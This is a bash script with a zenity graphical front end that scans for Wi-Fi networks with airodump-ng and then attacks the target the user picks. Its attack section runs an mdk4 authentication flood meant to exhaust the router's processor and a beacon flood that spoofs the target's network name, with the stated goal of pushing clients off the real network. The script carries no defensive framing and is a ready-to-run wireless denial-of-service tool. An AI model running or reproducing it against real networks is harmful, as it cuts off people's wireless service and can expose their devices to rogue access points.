#!/bin/bash

# --- 1. Fix Tool Requirements ---
if ! command -v xterm &> /dev/null; then
    sudo apt update && sudo apt install xterm -y
fi

# --- 2. Interface Selection GUI ---
INT_JAM=$(zenity --list --title="JAMMER (Card 1)" --column="Interfaces" $(ls /sys/class/net | grep wlan))
INT_MON=$(zenity --list --title="MONITOR (Card 2)" --column="Interfaces" $(ls /sys/class/net | grep wlan))

[ -z "$INT_JAM" ] || [ -z "$INT_MON" ] && exit 1

# --- 3. The Scanner (With Logic Gate) ---
rm -f /tmp/shabang-01.csv
# Launching scanner in background
xterm -geometry 100x24 -e "sudo airodump-ng $INT_MON --band g -w /tmp/shabang --output-format csv" &
SCAN_PID=$!

# Logic Gate: Wait for hardware initialization
echo "Initializing Hardware..."
while [ ! -f /tmp/shabang-01.csv ]; do
    sleep 1
done

zenity --info --text="SCANNING 2.4GHz.\n\nLook at the xterm window.\nClick OK when you see your target BSSID." --width=300
kill $SCAN_PID

# --- 4. Target Selection GUI ---
TARGET_RAW=$(awk -F, 'NR>2 {print $1 "|" $14}' /tmp/shabang-01.csv | zenity --list --title="Select Target" --column="BSSID" --column="SSID" --delimiter="|")
BSSID=$(echo $TARGET_RAW | cut -d'|' -f1 | tr -d ' ')
ESSID=$(echo $TARGET_RAW | cut -d'|' -f2 | tr -d ' ')
CH=$(grep "$BSSID" /tmp/shabang-01.csv | awk -F, '{print $4}' | tr -d ' ')

if [ -z "$BSSID" ]; then exit 1; fi

# --- 5. The "Shabang" Attack Logic ---
zenity --question --text="Target: $ESSID ($BSSID)\nChannel: $CH\n\nLaunch Unadulterated Hate mode?" --ok-label="SHABANG"

if [ $? -eq 0 ]; then
    # Lock frequencies
    sudo iw dev $INT_JAM set channel $CH
    sudo iw dev $INT_MON set channel $CH

    # [Window 1] The CPU Crusher (WPA3 SAE Flood)
    # Forces the router to choke on ECC math
    xterm -T "WPA3 SAE FLOOD" -e "sudo mdk4 $INT_JAM a -a $BSSID -m -s 1000" &

    # [Window 2] SSID Confusion (Beacon Flood)
    # Makes the client see 50+ fake versions of their network
    xterm -T "SSID CONFUSION" -e "sudo mdk4 $INT_MON b -n '$ESSID' -c $CH -s 100" &

    # [Window 3] The Monitor
    xterm -T "LIVE MONITOR" -e "sudo airodump-ng --bssid $BSSID --channel $CH $INT_MON" &

    zenity --info --text="SHABANG ACTIVE.\n\nReal network is being resource-exhausted.\nClients will now roam to stronger signals."
fi

# Cleanup
rm -f /tmp/shabang*
